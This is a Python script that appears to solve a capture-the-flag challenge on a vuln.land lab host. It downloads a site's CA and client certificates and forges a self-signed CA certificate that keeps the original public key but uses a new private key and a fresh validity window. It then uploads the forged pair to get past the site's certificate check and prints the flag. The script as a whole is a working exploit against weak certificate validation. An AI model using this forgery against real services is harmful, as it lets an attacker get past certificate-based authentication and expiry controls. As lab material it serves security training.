# This python scripts extends the validity of the client
# certificate by creating a CA Certificate with the same
# public key but with a new private key.
#
# 0. Enter the URL id
# 1. Download the CA & Client Certificate
# 2. Extract public key from CA Key
# 3. Create new certificate that has the original public key
#    and signed with the generated private key
# 4. Write the CA certificate to a .pem file
# 5. Upload the new CA Certificate & the existing
# client certificate to the site
# 6. Output the Flag

from OpenSSL import crypto
import requests
import re


def to_pem(cert: crypto.X509):
    return crypto.dump_certificate(crypto.FILETYPE_PEM, cert).decode("utf-8")


def from_pem(cert: str):
    return crypto.load_certificate(crypto.FILETYPE_PEM, bytes(cert, "utf-8"))


def getWebCert(url):
    cert_str = requests.get(url).text
    ca_cert = from_pem(cert_str)
    return ca_cert


def writeCert(cert, path):
    str_cert = to_pem(cert)
    f = open(path, "w")
    f.write(str_cert)
    f.close()
    return path


def export_certs(ca_cert, client_cert):
    writeCert(ca_cert, "./ca.pem")
    writeCert(client_cert, "./client.pem")


def getPubKeyFromCert(cert):
    dumped_key = crypto.dump_publickey(
        crypto.FILETYPE_PEM, cert.get_pubkey())
    pub_key = crypto.load_publickey(crypto.FILETYPE_PEM, dumped_key)
    return pub_key


def generate_key():
    key = crypto.PKey()
    key.generate_key(crypto.TYPE_RSA, 4096)
    return key


def generate_new_ca(dumped_key):
    ca_key_pub = dumped_key
    ca_key = generate_key()
    ca_cert = crypto.X509()
    ca_cert.get_subject().C = "CH"
    ca_cert.get_subject().ST = "Zurich"
    ca_cert.get_subject().L = "Zurich"
    ca_cert.get_subject().O = "SelfService Company Ltd"
    ca_cert.get_subject().OU = "SelfService IT Department"
    ca_cert.get_subject().CN = "SelfService Legacy Root CA"
    ca_cert.set_serial_number(420)
    ca_cert.gmtime_adj_notBefore(-(30 * 24 * 60 * 60))
    # This will extend the Validity of the
    ca_cert.gmtime_adj_notAfter((30 * 24 * 60 * 60))
    ca_cert.set_issuer(ca_cert.get_subject())
    ca_cert.set_pubkey(ca_key_pub)
    ca_cert.add_extensions(
        [
            crypto.X509Extension(b"basicConstraints",
                                 True, b"CA:TRUE,pathlen:0"),
            crypto.X509Extension(b"keyUsage", True, b"keyCertSign,cRLSign"),
            crypto.X509Extension(b"subjectKeyIdentifier",
                                 False, b"hash", subject=ca_cert),
        ]
    )
    ca_cert.add_extensions(
        [
            crypto.X509Extension(
                b"authorityKeyIdentifier", False, b"keyid:always", issuer=ca_cert
            ),
        ]
    )
    ca_cert.sign(ca_key, "sha512")
    return ca_cert


def send_certs(url):
    files = {'ca': open("./ca.pem", "rb"),
             'client': open("./client.pem", "rb")}
    req = requests.post(url, files=files)
    flag = re.search(r"<pre>(.*)", req.text)[0]
    new_flag = flag.replace("<pre>", "Flag: ")
    print(new_flag)


def main():
    url_id = input("URL id: ")
    url = "https://" + url_id + ".idocker.vuln.land"
    orig_ca_cert = getWebCert(url + "/ca.pem")
    client_cert = getWebCert(url + "/client.pem")
    dumped_pub_key = getPubKeyFromCert(orig_ca_cert)
    gen_ca_cert = generate_new_ca(dumped_pub_key)
    export_certs(gen_ca_cert, client_cert)
    send_certs(url + "/cert")


if __name__ == "__main__":
    main()
